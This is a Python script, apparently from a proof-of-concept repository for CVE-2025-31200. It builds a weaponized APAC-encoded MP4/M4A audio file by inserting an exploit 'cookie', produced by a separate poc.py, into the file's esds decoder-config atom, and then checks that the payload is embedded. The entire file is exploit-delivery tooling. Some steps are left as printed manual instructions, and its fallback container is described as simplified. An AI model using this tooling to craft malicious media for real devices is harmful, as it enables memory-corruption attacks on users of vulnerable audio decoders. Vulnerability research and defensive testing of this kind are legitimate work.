import subprocess
import struct
from pathlib import Path

def create_malicious_apac_file():
    """Create a malicious APAC-encoded MP4 file for CVE-2025-31200 testing"""
    
    print("Creating malicious APAC MP4 file...")
    legitimate_file = "data/legitimate_apac.m4a"
    try:
        cmd = [
            "afconvert", 
            "data/test_audio.wav", 
            "-o", legitimate_file,
            "-d", "apac", 
            "-f", "mp4f"
        ]
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        print(f"Created legitimate APAC file: {legitimate_file}")
        if not Path(legitimate_file).exists():
            raise FileNotFoundError("afconvert failed to create output file")
            
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print("afconvert not available or failed - need macOS for native APAC encoding")
        print("Alternative: Create basic MP4 container with malicious cookie")
        create_basic_malicious_mp4()
        return
    cookie_path = "data/exploit_cookie.dat"
    if not Path(cookie_path).exists():
        print(f"Error: {cookie_path} not found. Run poc.py first.")
        return
        
    with open(cookie_path, "rb") as f:
        malicious_cookie = f.read()
    
    print(f"Loaded malicious cookie: {len(malicious_cookie)} bytes")
    print("Manual MP4 atom patching required:")
    print("1. Locate 'esds' (Elementary Stream Descriptor) atom")
    print("2. Find DecoderConfigDescriptor section")
    print("3. Replace DecSpecificInfo with malicious cookie")
    print(f"4. Update atom sizes and offsets accordingly")
    malicious_file = "data/malicious_apac.m4a"
    print(f"Output file would be: {malicious_file}")
    
    return malicious_cookie

def create_basic_malicious_mp4():
    """Create a basic MP4 structure with embedded malicious APAC cookie"""
    
    malicious_file = "data/basic_malicious.mp4"
    with open("data/exploit_cookie.dat", "rb") as f:
        malicious_cookie = f.read()
    mp4_data = bytearray()
    ftyp = b'ftyp' + b'M4A ' + struct.pack('>I', 0) + b'M4A mp41'
    mp4_data.extend(struct.pack('>I', len(ftyp) + 4) + ftyp)
    audio_frame = b'\x00' * 1024
    mdat = b'mdat' + audio_frame
    mp4_data.extend(struct.pack('>I', len(mdat) + 4) + mdat)
    config_atom = b'esds' + b'\x00' * 4 + malicious_cookie
    moov_content = b'moov' + config_atom
    mp4_data.extend(struct.pack('>I', len(moov_content) + 4) + moov_content)
    
    with open(malicious_file, "wb") as f:
        f.write(mp4_data)
    
    print(f"Created basic malicious MP4: {malicious_file}")
    print("Note: This is a simplified structure for demonstration")

def verify_malicious_file(filepath):
    """Verify the malicious file contains our exploit payload"""
    
    if not Path(filepath).exists():
        print(f"File not found: {filepath}")
        return False
        
    with open(filepath, "rb") as f:
        data = f.read()
    with open("data/exploit_cookie.dat", "rb") as f:
        cookie = f.read()
    
    if cookie[:10] in data:
        print(f"Malicious payload found in {filepath}")
        return True
    else:
        print(f"Malicious payload NOT found in {filepath}")
        return False

if __name__ == "__main__":
    create_malicious_apac_file()
    test_files = ["data/legitimate_apac.m4a", "data/basic_malicious.mp4"]
    for filepath in test_files:
        if Path(filepath).exists():
            verify_malicious_file(filepath)